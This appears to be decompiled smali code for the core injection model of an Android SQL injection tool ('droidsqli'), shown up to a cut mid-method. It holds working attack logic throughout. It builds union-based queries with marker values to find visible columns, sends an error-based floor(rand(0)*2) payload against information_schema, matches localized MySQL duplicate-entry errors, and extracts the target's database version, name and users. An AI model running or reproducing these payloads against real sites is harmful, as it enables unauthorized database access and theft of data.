.class public Lnet/edgard/droidsqli/mvc/model/InjectionModel;
.super Lnet/edgard/droidsqli/mvc/model/ModelObservable;
.source "InjectionModel.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;,
        Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInsertionCharacter;,
        Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;
    }
.end annotation


# instance fields
.field public authenticatedUser:Ljava/lang/String;

.field private blindModel:Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

.field public cookieData:Ljava/lang/String;

.field public currentDB:Ljava/lang/String;

.field public currentUser:Ljava/lang/String;

.field public firstSuccessPageSource:Ljava/lang/String;

.field public getData:Ljava/lang/String;

.field hasFileRight:Z

.field public headerData:Ljava/lang/String;

.field public initialQuery:Ljava/lang/String;

.field public initialUrl:Ljava/lang/String;

.field public insertionCharacter:Ljava/lang/String;

.field public isBlindInjectable:Z

.field public isErrorBasedInjectable:Z

.field public isInjectionBuilt:Z

.field public isNormalInjectable:Z

.field public isProxyfied:Z

.field public isTimeBasedInjectable:Z

.field public method:Ljava/lang/String;

.field public pathFile:Ljava/lang/String;

.field public postData:Ljava/lang/String;

.field public proxyAddress:Ljava/lang/String;

.field public proxyPort:Ljava/lang/String;

.field public securitySteps:I

.field private timeModel:Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;

.field public useBlindInjection:Z

.field public useErrorBasedInjection:Z

.field public useTimeBasedInjection:Z

.field public versionDB:Ljava/lang/String;

.field public visibleIndex:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 8

    .prologue
    const/4 v7, 0x0

    .line 87
    invoke-direct {p0}, Lnet/edgard/droidsqli/mvc/model/ModelObservable;-><init>()V

    .line 70
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isProxyfied:Z

    .line 72
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isNormalInjectable:Z

    .line 73
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isErrorBasedInjectable:Z

    .line 74
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isTimeBasedInjectable:Z

    .line 75
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isBlindInjectable:Z

    .line 77
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useErrorBasedInjection:Z

    .line 78
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useBlindInjection:Z

    .line 79
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->useTimeBasedInjection:Z

    .line 81
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isInjectionBuilt:Z

    .line 101
    iput v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    .line 747
    iput-boolean v7, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->hasFileRight:Z

    .line 90
    invoke-static {}, Ljava/util/prefs/Preferences;->userRoot()Ljava/util/prefs/Preferences;

    move-result-object v5

    const-class v6, Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    invoke-virtual {v6}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/util/prefs/Preferences;->node(Ljava/lang/String;)Ljava/util/prefs/Preferences;

    move-result-object v4

    .line 91
    .local v4, "prefs":Ljava/util/prefs/Preferences;
    const-string v0, "isProxyfied"

    .line 92
    .local v0, "ID1":Ljava/lang/String;
    const-string v1, "proxyAddress"

    .line 93
    .local v1, "ID2":Ljava/lang/String;
    const-string v2, "proxyPort"

    .line 94
    .local v2, "ID3":Ljava/lang/String;
    const-string v3, "pathFile"

    .line 95
    .local v3, "ID4":Ljava/lang/String;
    invoke-virtual {v4, v0, v7}, Ljava/util/prefs/Preferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    iput-boolean v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->isProxyfied:Z

    .line 96
    const-string v5, "127.0.0.1"

    invoke-virtual {v4, v1, v5}, Ljava/util/prefs/Preferences;->get(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyAddress:Ljava/lang/String;

    .line 97
    const-string v5, "8118"

    invoke-virtual {v4, v2, v5}, Ljava/util/prefs/Preferences;->get(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->proxyPort:Ljava/lang/String;

    .line 98
    const-string v5, "user.dir"

    invoke-static {v5}, Ljava/lang/System;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v3, v5}, Ljava/util/prefs/Preferences;->get(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->pathFile:Ljava/lang/String;

    .line 99
    return-void
.end method

.method static synthetic access$0(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;
    .locals 1

    .prologue
    .line 85
    iget-object v0, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->timeModel:Lnet/edgard/droidsqli/mvc/model/blind/TimeInjection;

    return-object v0
.end method

.method static synthetic access$1(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;
    .locals 1

    .prologue
    .line 84
    iget-object v0, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->blindModel:Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

    return-object v0
.end method

.method private buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p1, "dataType"    # Ljava/lang/String;
    .param p2, "newData"    # Ljava/lang/String;
    .param p3, "useVisibleIndex"    # Z
    .param p4, "urlPremiere"    # Ljava/lang/String;

    .prologue
    .line 1474
    iget-object v0, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->method:Ljava/lang/String;

    invoke-virtual {v0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    .line 1479
    .end local p2    # "newData":Ljava/lang/String;
    :goto_0
    return-object p2

    .line 1476
    .restart local p2    # "newData":Ljava/lang/String;
    :cond_0
    if-nez p3, :cond_1

    .line 1477
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    goto :goto_0

    .line 1479
    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-static {p2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "1337"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->visibleIndex:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "7331"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "("

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, ")"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    goto :goto_0
.end method

.method private getDBInfos()V
    .locals 10
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    const/4 v9, 0x3

    const/4 v8, 0x2

    const/4 v7, 0x1

    const/4 v6, 0x0

    .line 559
    new-array v1, v7, [Ljava/lang/String;

    const-string v2, ""

    aput-object v2, v1, v6

    .line 561
    .local v1, "sourcePage":[Ljava/lang/String;
    new-instance v2, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v2, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    const/4 v3, 0x5

    new-array v3, v3, [Ljava/lang/Object;

    .line 562
    const-string v4, "concat(hex(concat_ws(0x7b257d,version(),database(),user(),CURRENT_USER)),0x69)"

    aput-object v4, v3, v6

    .line 575
    aput-object v1, v3, v7

    .line 576
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    aput-object v4, v3, v8

    .line 577
    invoke-static {v6}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    aput-object v4, v3, v9

    const/4 v4, 0x4

    .line 578
    const/4 v5, 0x0

    aput-object v5, v3, v4

    .line 561
    invoke-virtual {v2, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    .line 580
    .local v0, "hexResult":Ljava/lang/String;
    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 581
    const-string v2, "Show db info failed"

    aget-object v3, v1, v6

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v2, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    .line 582
    new-instance v2, Lnet/edgard/droidsqli/exception/PreparationException;

    invoke-direct {v2}, Lnet/edgard/droidsqli/exception/PreparationException;-><init>()V

    throw v2

    .line 585
    :cond_0
    invoke-static {v0}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\\{%\\}"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    aget-object v2, v2, v6

    iput-object v2, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->versionDB:Ljava/lang/String;

    .line 586
    invoke-static {v0}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\\{%\\}"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    aget-object v2, v2, v7

    iput-object v2, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->currentDB:Ljava/lang/String;

    .line 587
    invoke-static {v0}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\\{%\\}"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    aget-object v2, v2, v8

    iput-object v2, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->currentUser:Ljava/lang/String;

    .line 588
    invoke-static {v0}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "\\{%\\}"

    invoke-virtual {v2, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    aget-object v2, v2, v9

    iput-object v2, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->authenticatedUser:Ljava/lang/String;

    .line 591
    new-instance v2, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v3, "add-info"

    invoke-direct {v2, p0, v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-virtual {v2}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 592
    return-void
.end method

.method private getVisibleIndex(Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .param p1, "firstSuccessPageSource"    # Ljava/lang/String;

    .prologue
    .line 432
    const-string v8, "1337(\\d+?)7331"

    const/16 v9, 0x20

    invoke-static {v8, v9}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v8

    invoke-virtual {v8, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v7

    .line 433
    .local v7, "regexSearch":Ljava/util/regex/Matcher;
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 434
    .local v0, "foundIndexes":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    :goto_0
    invoke-virtual {v7}, Ljava/util/regex/Matcher;->find()Z

    move-result v8

    if-nez v8, :cond_0

    .line 437
    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v8

    new-array v8, v8, [Ljava/lang/String;

    invoke-virtual {v0, v8}, Ljava/util/ArrayList;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v2

    check-cast v2, [Ljava/lang/String;

    .line 440
    .local v2, "indexes":[Ljava/lang/String;
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "1337(?!"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, "|"

    invoke-static {v2, v10}, Lnet/edgard/droidsqli/tool/StringTool;->join([Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "7331)\\d*7331"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    const-string v10, "1"

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    iput-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    .line 441
    array-length v8, v2

    const/4 v9, 0x1

    if-ne v8, v9, :cond_1

    .line 442
    const/4 v8, 0x0

    aget-object v8, v2, v8

    .line 491
    :goto_1
    return-object v8

    .line 435
    .end local v2    # "indexes":[Ljava/lang/String;
    :cond_0
    const/4 v8, 0x1

    invoke-virtual {v7, v8}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 449
    .restart local v2    # "indexes":[Ljava/lang/String;
    :cond_1
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    .line 450
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "1337("

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, "|"

    invoke-static {v2, v10}, Lnet/edgard/droidsqli/tool/StringTool;->join([Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, ")7331"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 451
    const-string v10, "(select+concat(0x53514c69,$1,repeat(0xb8,1024),0x694c5153))"

    .line 449
    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 454
    .local v4, "performanceQuery":Ljava/lang/String;
    invoke-virtual {p0, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inject(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 459
    .local v6, "performanceSourcePage":Ljava/lang/String;
    const-string v8, "SQLi(\\d+)(#*)"

    const/16 v9, 0x20

    invoke-static {v8, v9}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v8

    invoke-virtual {v8, v6}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v7

    .line 460
    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    .line 461
    .local v5, "performanceResults":Ljava/util/ArrayList;, "Ljava/util/ArrayList<[Ljava/lang/String;>;"
    :goto_2
    invoke-virtual {v7}, Ljava/util/regex/Matcher;->find()Z

    move-result v8

    if-nez v8, :cond_2

    .line 467
    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v8

    const/4 v9, 0x2

    filled-new-array {v8, v9}, [I

    move-result-object v8

    const-class v9, Ljava/lang/Integer;

    invoke-static {v9, v8}, Ljava/lang/reflect/Array;->newInstance(Ljava/lang/Class;[I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, [[Ljava/lang/Integer;

    .line 468
    .local v3, "lengthFields":[[Ljava/lang/Integer;
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_3
    invoke-virtual {v5}, Ljava/util/ArrayList;->size()I

    move-result v8

    if-lt v1, v8, :cond_3

    .line 476
    new-instance v8, Lnet/edgard/droidsqli/mvc/model/InjectionModel$1;

    invoke-direct {v8, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$1;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    invoke-static {v3, v8}, Ljava/util/Arrays;->sort([Ljava/lang/Object;Ljava/util/Comparator;)V

    .line 487
    iget-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    .line 488
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "1337(?!"

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    array-length v10, v3

    add-int/lit8 v10, v10, -0x1

    aget-object v10, v3, v10

    const/4 v11, 0x1

    aget-object v10, v10, v11

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "7331)\\d*7331"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 489
    const-string v10, "1"

    .line 487
    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    .line 486
    iput-object v8, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    .line 491
    array-length v8, v3

    add-int/lit8 v8, v8, -0x1

    aget-object v8, v3, v8

    const/4 v9, 0x1

    aget-object v8, v8, v9

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v8

    invoke-static {v8}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v8

    goto/16 :goto_1

    .line 462
    .end local v1    # "i":I
    .end local v3    # "lengthFields":[[Ljava/lang/Integer;
    :cond_2
    const/4 v8, 0x2

    new-array v8, v8, [Ljava/lang/String;

    const/4 v9, 0x0

    const/4 v10, 0x1

    invoke-virtual {v7, v10}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    const/4 v9, 0x1

    const/4 v10, 0x2

    invoke-virtual {v7, v10}, Ljava/util/regex/Matcher;->group(I)Ljava/lang/String;

    move-result-object v10

    aput-object v10, v8, v9

    invoke-virtual {v5, v8}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    goto :goto_2

    .line 470
    .restart local v1    # "i":I
    .restart local v3    # "lengthFields":[[Ljava/lang/Integer;
    :cond_3
    const/4 v8, 0x2

    new-array v9, v8, [Ljava/lang/Integer;

    const/4 v10, 0x0

    .line 471
    invoke-virtual {v5, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, [Ljava/lang/String;

    const/4 v11, 0x1

    aget-object v8, v8, v11

    invoke-virtual {v8}, Ljava/lang/String;->length()I

    move-result v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    aput-object v8, v9, v10

    const/4 v10, 0x1

    .line 472
    invoke-virtual {v5, v1}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, [Ljava/lang/String;

    const/4 v11, 0x0

    aget-object v8, v8, v11

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    aput-object v8, v9, v10

    .line 469
    aput-object v9, v3, v1

    .line 468
    add-int/lit8 v1, v1, 0x1

    goto/16 :goto_3
.end method

.method private isBlindInjectable()Z
    .locals 1
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;
        }
    .end annotation

    .prologue
    .line 541
    new-instance v0, Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

    invoke-direct {v0, p0}, Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    iput-object v0, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->blindModel:Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

    .line 542
    iget-object v0, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->blindModel:Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;

    invoke-virtual {v0}, Lnet/edgard/droidsqli/mvc/model/blind/BlindInjection;->isBlindInjectable()Z

    move-result v0

    return v0
.end method

.method private isErrorBasedInjectable()Z
    .locals 4

    .prologue
    const/4 v3, -0x1

    .line 499
    .line 500
    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 501
    const-string v2, "+and("

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 502
    const-string v2, "select+1+"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 503
    const-string v2, "from("

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 504
    const-string v2, "select+"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 505
    const-string v2, "count(*),"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 506
    const-string v2, "floor(rand(0)*2)"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 507
    const-string v2, "from+"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 508
    const-string v2, "information_schema.tables+"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 509
    const-string v2, "group+by+2"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 510
    const-string v2, ")a"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 511
    const-string v2, ")--+"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 500
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 499
    invoke-virtual {p0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inject(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 514
    .local v0, "performanceSourcePage":Ljava/lang/String;
    const-string v1, "Duplicate entry \'1\' for key "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 515
    const-string v1, "Like verdier \'1\' for "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 516
    const-string v1, "Like verdiar \'1\' for "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 517
    const-string v1, "Kattuv v\ufffd\ufffdrtus \'1\' v\ufffdtmele "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 518
    const-string v1, "Opakovan\ufffd k\ufffd\ufffd\ufffd \'1\' (\ufffd\ufffdslo k\ufffd\ufffd\ufffda "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 519
    const-string v1, "pienie \'1\' dla klucza "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 520
    const-string v1, "Duplikalt bejegyzes \'1\' a "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 521
    const-string v1, "Ens v\ufffdrdier \'1\' for indeks "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 522
    const-string v1, "Dubbel nyckel \'1\' f\ufffdr nyckel "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 523
    const-string v1, "kl\ufffd\ufffd \'1\' (\ufffd\ufffdslo kl\ufffd\ufffde "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

    if-ne v1, v3, :cond_0

    .line 524
    const-string v1, "Duplicata du champ \'1\' pour la clef "

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v1

